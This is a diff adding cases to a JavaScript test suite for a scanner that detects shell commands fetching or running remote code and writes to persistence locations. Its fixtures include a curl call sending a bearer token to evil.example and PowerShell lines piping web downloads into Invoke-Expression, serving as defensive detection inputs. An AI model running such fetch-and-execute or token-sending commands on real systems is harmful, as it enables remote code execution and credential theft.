@@ -186,6 +186,7 @@ test('shell commands fetching or handing off code, in a script\'s strings', () =
     'spawn("curl", ["-o", outputPath, options.flag, "https://evil.example/x"])',
     'spawn("curl", ["-o", outputs[i], options?.flag, "https://evil.example/x"])',
   ].join('\n')), { shell: [1, 2, 3, 4, 5, 6] }, 'a program run with its arguments apart, a variable\'s or a property\'s value between')
+  assert.deepEqual(found('a.js', `spawn("curl", ["-H", "Authorization: Bearer ${'x'.repeat(600)}", "https://evil.example/p"])\n`), { shell: [1] }, 'a long argument before the URL')
   assert.equal(found('a.js', [
     'const shells = "bash|zsh|sh"',
     'const also = "bash | zsh | sh"',
@@ -272,6 +273,8 @@ test('a shell script is read whole for its shell commands and the places it name
     'Invoke-WebRequest https://x.example/f -OutFile f',
     '$iex = 1; $irm = 2',
   ].join('\n')), { shell: [1, 2, 3], persistence: [4, 5] }, 'PowerShell running what it fetches, and its profile')
+  assert.deepEqual(found('setup.ps1', 'Invoke-Expression \u0060\n  (Invoke-WebRequest https://evil.example/p).Content\nirm https://get.example \u0060\n  | iex\niex $x\niwr https://x.example/f -OutFile f\n'), { shell: [1, 3] },
+    'its line continued by a backtick, not the next line')
   assert.equal(found('setup.sh', 'x=\u0060date\u0060 # curl https://x.example/x\n'), null, 'sh\'s backticks no escapes')
   assert.equal(found('bin/setup', '#!/usr/bin/env pwsh\n<# curl https://x.example/install #>\nWrite-Host ok\n'), null, 'PowerShell\'s comments by its hashbang')
   assert.deepEqual(found('install.sh', 'echo "a # curl https://x.example/x" | sh\necho ${#x} curl https://x.example/y\n'), { shell: [1, 2] }, 'a # quoted, or no comment\'s')
@@ -353,6 +356,7 @@ test('a text reads in time as its length, what is left open read to its end', { 
     [`"${'certutil '.repeat(2e5)}"\n`, null],
     [`${"'.claude', ".repeat(1e5)}'settings.json'\n`, { persistence: [1] }],
     [`${"'curl', ".repeat(1e5)}'https://x'\n`, { shell: [1] }],
+    [`'curl', '${'x'.repeat(1e6)}', ${"'-x', ".repeat(1e5)}'https://x'\n`, null],
     [`${"'systemd', ".repeat(1e5)}'user'\n`, { persistence: [1] }],
     [`'systemctl', ${"'--user', ".repeat(1e5)}\n`, null],
     [`"${'sh |'.repeat(3e5)}"\n`, null],
